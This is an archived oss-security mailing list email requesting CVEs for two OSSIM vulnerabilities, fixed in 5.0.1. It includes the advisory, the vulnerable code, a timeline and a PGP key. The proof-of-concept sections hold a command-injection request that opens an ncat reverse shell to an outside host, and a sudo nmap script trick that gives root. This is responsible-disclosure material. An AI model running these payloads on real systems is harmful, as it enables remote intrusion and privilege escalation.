X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["8821" "Wednesday" "13" "May" "2015" "10:29:26" "+0200" "Damien Cauquil" "d.cauquil@sysdream.com" "<55530B66.3000209@sysdream.com>" "271" "[oss-security] CVE Request: OSSIM multiple vulnerabilities" nil nil nil "5" "2015051308:29:26" "[oss-security] CVE Request: OSSIM multiple vulnerabilities" (number mark "        d.cauquil@sy May 13  271/8821  " thread-indent "\"[oss-security] CVE Request: OSSIM multiple vulnerabilities\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 1987 invoked by uid 550); 13 May 2015 08:29:40 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 1966 invoked from network); 13 May 2015 08:29:40 -0000
X-Virus-Scanned: amavisd-new at sysdream.com
Message-ID: <55530B66.3000209@sysdream.com>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Thunderbird/31.5.0
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="------------010509080206030104070309"
CC: Vincent Hautot <v.hautot@sysdream.com>
Date: Wed, 13 May 2015 10:29:26 +0200
From: Damien Cauquil <d.cauquil@sysdream.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] CVE Request: OSSIM multiple vulnerabilities
To: oss-security@lists.openwall.com

--------------010509080206030104070309
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: 7bit

Could two CVEs please be assigned for the following ?

Vulnerabilities have been fixed and announced by the vendor:

https://www.alienvault.com/forums/discussion/5127

Our original advisory follows.


Regards,

Damien Cauquil



================================================
Multiple vulnerabilities in OSSIM < 5.0.1
================================================


Description
===========

Multiple vulnerabilities were found in OSSIM < 5.0.1:
 * an authenticated arbitrary command execution vulnerability
 * a local privilege escalation vulnerability


Authenticated arbitrary command execution
=========================================

OSSIM launches a network discovery with the form located at
http://IP/ossim/netscan/ but failed at sanitizing a supplied parameter
(assets[]) when processing the request, resulting in an arbitrary
command execution.

**CVSS v2 Base Score**: 6.5

**CVSS v2 Vector**: (AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:N)

**AlienVault ID**: ENG-99865

**CVE-ID**: <Requested>

----------------
Proof of Concept
----------------

  ```
  GET
/ossim/netscan/do_scan.php?assets%5B%5D=20003CBCDEC611E489FF000C2';ncat%20-e%20/bin/sh%20192.168.31.1%20
8088;echo'99CDC78%23192.168.31.67%2F32&searchbox=Type+here+to+search+assets&sensor=local&scan_mode=fast&custom_ports=1-65535&timing_template=-T3&autodetect=1&rdns=1
HTTP/1.1
  Host: 192.168.31.67
  User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101
Firefox/35.0
  Accept: application/json, text/javascript, */*; q=0.01
  Accept-Language: fr,fr-fr;q=0.8,en-us;q=0.5,en;q=0.3
  Accept-Encoding: gzip, deflate
  DNT: 1
  X-Requested-With: XMLHttpRequest
  Referer: https://192.168.31.67/ossim/netscan/
  Cookie: PHPSESSID=ii3vcqvm9por0qu3iolm4n8ir7
  Connection: keep-alive
  ```

---------------
Vulnerable code
---------------

The vulnerable code is located in
/usr/share/ossim/www/netscan/do_scan.php, line 176:

```
if ($data['status'] == 'success')
{
    //Delete previous scan
    $scan = new Scan();
    $scan->delete_data();

    // Launch scan in background
    $cmd = "/usr/bin/php
/usr/share/ossim/scripts/vulnmeter/remote_nmap.php '$assets_p'
'$scanning_sensor' '$timing_template' '$scan_mode' '" .
Session::get_session_user() . "' '$autodetect$

    system($cmd);
}
```

--------
Solution
--------

Upgrade to OSSIM 5.0.1



Local privilege escalation
==========================

OSSIM uses *sudo* to launch a nmap scan for network discovery, allowing
privilege escalation through a specifically crafted nmap script.

**CVSS v2 Base Score**: 3.4

**CVSS v2 Vector**:  (AV:L/AC:L/PR:H/UI:N/S:U/C:L/I:L/A:N)

**AlienVault ID**: ENG-99866

**CVE-ID**: <requested>

----------------
Proof of Concept
----------------

```
python -c "import pty; pty.spawn('/bin/bash')"
www-data@alienvault:/usr/share/ossim/www/netscan$ id
uid=33(www-data) gid=33(www-data)
groups=33(www-data),103(alienvault),114(nagios)
www-data@alienvault:/usr/share/ossim/www/netscan$ echo 'local os =
require "os"
os.execute("id")' > /tmp/exec
www-data@alienvault:/usr/share/ossim/www/netscan$ sudo nmap
--script=/tmp/exec 127.0.0.1 -p 80

Starting Nmap 6.40 ( http://nmap.org ) at 2015-04-09 16:09 CEST
NSE: Warning: Loading '/tmp/exec' -- the recommended file extension is
'.nse'.
uid=0(root) gid=0(root) groups=0(root)
```

---------------
Vulnerable code
---------------

/etc/sudoers
```
[...]
www-data ALL=NOPASSWD: /usr/bin/nmap
[...]
```

--------
Solution
--------

Upgrade to OSSIM 5.0.1


Timeline
========

* 04/17/2015: Vendor notified
* 04/18/2015: Vendor replied
* 04/22/2015: Vendor confirmed the vulnerabilities
* 05/12/2015: Vendor issued fix (included in version 5.0.1 of OSSIM)


Credits
=======

* Vincent Hautot, Sysdream (v.hautot -at- sysdream -dot- com)
* Damien CAUQUIL, Sysdream (d.cauquil -at- sysdream -dot- com)


Contact
=======

* Website: http://www.sysdream.com
* Twitter: @sysdream

-- 

Damien Cauquil
Directeur R&D / Head of Research
Certified EC-Council Instructor / CEH / CHFI / ECSA

Sysdream
14, place Marie-Jeanne Bassot
92300 Levallois-Perret 

Tel: +33 (0)1 78 76 58 21


--------------010509080206030104070309
Content-Type: application/pgp-keys;
 name="0x0B1AFCDD.asc"
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment;
 filename="0x0B1AFCDD.asc"

-----BEGIN PGP PUBLIC KEY BLOCK-----
Version: GnuPG v2

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
Nq8=
=1T4o
-----END PGP PUBLIC KEY BLOCK-----

--------------010509080206030104070309--
